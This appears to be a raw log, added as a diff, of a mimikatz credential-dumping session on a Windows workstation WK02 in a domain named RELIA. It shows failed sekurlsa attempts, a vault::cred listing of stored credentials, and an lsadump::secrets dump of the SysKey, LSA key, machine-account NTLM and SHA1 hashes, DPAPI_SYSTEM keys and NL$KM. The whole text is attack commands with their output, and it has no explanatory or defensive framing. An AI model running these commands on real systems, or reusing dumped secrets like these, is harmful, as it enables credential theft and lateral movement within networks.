+old/hex : 76 a7 53 e9 85 18 b7 ec 26 e8 71 c5 c0 63 e2 45 6a 45 a3 98 84 81 95 a9 90 b1 cf 57 67 1a 26 c2 98 02 15 70 ff 1b 88 92 c0 6b 04 a0 35 53 71 54 e5 b2 5d 9c 2a 8b c2 24 09 e2 9d 9b 05 bf 57 69 
+
+mimikatz(commandline) # sekurlsa::tickets
+Opening : 'lsass.dmp' file for minidump...
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)
+
+mimikatz(commandline) # sekurlsa::tickets /export
+Opening : 'lsass.dmp' file for minidump...
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)
+
+mimikatz(commandline) # sekurlsa::msv
+Opening : 'lsass.dmp' file for minidump...
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)
+
+mimikatz(commandline) # sekurlsa::credman
+Opening : 'lsass.dmp' file for minidump...
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000002)
+
+mimikatz(commandline) # vault::cred 
+TargetName : XboxLive / <NULL>
+UserName   : <NULL>
+Comment    : <NULL>
+Type       : 1 - generic
+Persist    : 1 - session
+Flags      : 00000000
+Credential : 45 43 53 32 20 00 00 00 4d 97 e4 c6 0c 77 f6 fa df 41 6c b3 b4 b1 26 8d ca b4 94 fb 75 cd f3 88 d8 ce 12 24 84 d9 81 65 09 67 18 fa 08 cf 02 d3 c5 2d 87 91 34 7f 8b ec e4 17 b1 21 ab 20 4c 20 7b fe 9c f6 42 c2 1d aa 05 e1 1c 45 8f 57 6c 54 8e 2e c1 d3 aa ac 7a 86 b8 53 a0 0a 03 72 5c 46 e9 58 d2 c2 db 54 f7 f0 
+Attributes : 0
+
+TargetName : LegacyGeneric:target=XboxLive / <NULL>
+UserName   : <NULL>
+Comment    : <NULL>
+Type       : 1 - generic
+Persist    : 1 - session
+Flags      : 00000000
+Credential : 45 43 53 32 20 00 00 00 4d 97 e4 c6 0c 77 f6 fa df 41 6c b3 b4 b1 26 8d ca b4 94 fb 75 cd f3 88 d8 ce 12 24 84 d9 81 65 09 67 18 fa 08 cf 02 d3 c5 2d 87 91 34 7f 8b ec e4 17 b1 21 ab 20 4c 20 7b fe 9c f6 42 c2 1d aa 05 e1 1c 45 8f 57 6c 54 8e 2e c1 d3 aa ac 7a 86 b8 53 a0 0a 03 72 5c 46 e9 58 d2 c2 db 54 f7 f0 
+Attributes : 0
+
+TargetName : MicrosoftAccount:target=SSO_POP_Device / <NULL>
+UserName   : 02jpumbspqvllygp
+Comment    : Microsoft_WindowsLive:SerializedMaterial:5760
+Type       : 1 - generic
+Persist    : 1 - session
+Flags      : 00000000
+Credential : 
+Attributes : 23
+
+TargetName : WindowsLive:target=virtualapp/didlogical / <NULL>
+UserName   : 02jpumbspqvllygp
+Comment    : PersistedCredential
+Type       : 1 - generic
+Persist    : 2 - local_machine
+Flags      : 00000000
+Credential : 
+Attributes : 32
+
+TargetName : Domain:batch=TaskScheduler:Task:{68651929-A1D4-4310-8C92-DAC437432FDA} / <NULL>
+UserName   : RELIA\milana
+Comment    : <NULL>
+Type       : 2 - domain_password
+Persist    : 2 - local_machine
+Flags      : 00004004
+Credential : 
+Attributes : 0
+
+
+mimikatz(commandline) # vault::cred /patch
+ERROR kuhl_m_vault_cred ; kull_m_patch (0x00000000)
+
+mimikatz(commandline) # lsadump::secrets
+Domain : WK02
+SysKey : 3c14829aac20b1d386e8a4ddfbb3ce24
+
+Local name : WK02 ( S-1-5-21-2398429190-2702603168-1445831987 )
+Domain name : RELIA ( S-1-5-21-3972710054-930304531-4277621697 )
+Domain FQDN : relia.com
+
+Policy subsystem is : 1.18
+LSA Key(s) : 1, default {3eb3b21a-50ed-c913-d664-95250abeda28}
+  [00] {3eb3b21a-50ed-c913-d664-95250abeda28} 3e4e9f1fb888cf476d21b61709d8d5febdee0ebaec53206805f7a2b8ea2f14b6
+
+Secret  : $MACHINE.ACC
+cur/hex : 6e e6 b8 f2 62 02 20 c5 c3 70 5c 9a 7d 2d 97 29 58 85 75 2e 26 60 f3 7f 8c 7d 83 ab 62 30 19 e4 ef b9 2a 9c 66 d6 7d c9 6c 3c 23 db 5f 4d 41 81 7e 75 b3 06 22 cc 9b d0 f0 f7 00 0a 8c e6 d8 e2 6f 86 c5 ef 8e 00 9f 55 df a2 a4 95 f2 9c 49 8e 70 68 4a a2 ad 0b 19 5e 72 8c a6 76 ce c4 7d 7b f1 5b 1f 4d 0e 53 be b0 c8 9b 44 38 5f 85 a2 dd 1f 72 4b 29 59 33 6a b4 c0 70 c5 9e 0b 8b 3e 92 03 70 55 bd 08 e6 c1 f0 70 55 e5 c2 b7 26 fe 24 69 21 93 c0 2b 87 0c ea b7 f5 58 e4 94 d2 f6 0c bd 61 87 56 71 e1 6a a3 e4 3a 77 bc 56 f4 6d f4 ad 4f 88 17 bf 37 d3 0b e4 20 dc c1 36 03 4b 07 c8 c5 df 77 97 68 1e 24 0d f7 23 f2 c0 27 b1 fd c6 6c 4a 10 3a 8e c4 2d 6b c9 2e ec 80 bd 9d bd 29 4d 7b d9 6c 37 fb 45 ec 7b 16 36 56 5d 53 54 
+    NTLM:3b532cfbff7ca357f34fc01853e246c8
+    SHA1:e3ed9d85150338c7d2e0dd34aca8db18298201e0
+old/hex : 23 0f 41 6c 39 54 1c 4d 3c d8 8c 01 2b b7 b0 68 5d b0 c2 7d cd ce 96 d5 57 b1 b2 1d 83 1d 44 f2 95 d8 fb 29 74 07 65 60 09 56 9e 2c 32 b9 19 2b bb 67 b3 1c 0b bd ca 88 a7 52 50 c5 0f 98 4b 20 fd 31 67 74 b6 ca 64 56 6a 9e 50 30 b0 43 73 bc 2d 92 21 a1 10 fb 3d 73 cd 1c 24 23 63 9b 63 7d 4a 17 4e d8 ff 68 f7 a9 e1 e1 1c 9a 3e 8a 0b 3e b5 79 a9 9d b9 f8 16 98 56 95 85 fe f4 ed f1 fe f8 ee b8 24 53 44 9d 64 2a c9 ab e0 56 56 6b 66 42 8f ef 20 58 76 7e ea 70 f8 18 a1 29 0b c3 e8 4c a6 f1 8e b4 88 42 b1 d6 34 e1 84 b4 d5 dd b8 2c 84 bc 98 fd 6b 91 1a a1 82 a8 16 cc 31 80 3d 58 20 c4 f9 14 a7 23 db ff a0 41 74 57 da 39 c9 3a 82 2b 82 91 f3 d4 0e f2 39 ad 07 54 68 da 58 b2 99 28 d3 af 7d 5c 06 b5 19 1e df 87 f6 13 82 
+    NTLM:45405dfe3c29b4ce2a194543cad1bab3
+    SHA1:ede40511c44b734a298b8d0cf6303190961ecd7b
+
+Secret  : DefaultPassword
+
+Secret  : DPAPI_SYSTEM
+cur/hex : 01 00 00 00 39 d8 63 a5 ce 1c 7d 3c 07 3d f3 69 01 d5 15 9e 0b a3 63 1d bc 28 87 e4 29 5b ff bb 52 be 65 d4 3e 15 38 b3 9c 4e 76 5a 
+    full: 39d863a5ce1c7d3c073df36901d5159e0ba3631dbc2887e4295bffbb52be65d43e1538b39c4e765a
+    m/u : 39d863a5ce1c7d3c073df36901d5159e0ba3631d / bc2887e4295bffbb52be65d43e1538b39c4e765a
+old/hex : 01 00 00 00 c6 92 66 62 7b cc 01 3c de 98 53 51 45 0f 1a 15 10 b5 79 1a be 09 42 fc 0d a7 40 ea 70 a4 5e 8b 84 d0 1d 42 63 88 74 df 
+    full: c69266627bcc013cde985351450f1a1510b5791abe0942fc0da740ea70a45e8b84d01d42638874df
+    m/u : c69266627bcc013cde985351450f1a1510b5791a / be0942fc0da740ea70a45e8b84d01d42638874df
+
+Secret  : NL$KM
+cur/hex : 76 a7 53 e9 85 18 b7 ec 26 e8 71 c5 c0 63 e2 45 6a 45 a3 98 84 81 95 a9 90 b1 cf 57 67 1a 26 c2 98 02 15 70 ff 1b 88 92 c0 6b 04 a0 35 53 71 54 e5 b2 5d 9c 2a 8b c2 24 09 e2 9d 9b 05 bf 57 69 
+old/hex : 76 a7 53 e9 85 18 b7 ec 26 e8 71 c5 c0 63 e2 45 6a 45 a3 98 84 81 95 a9 90 b1 cf 57 67 1a 26 c2 98 02 15 70 ff 1b 88 92 c0 6b 04 a0 35 53 71 54 e5 b2 5d 9c 2a 8b c2 24 09 e2 9d 9b 05 bf 57 69 
+
+mimikatz(commandline) # exit
+Bye!
+
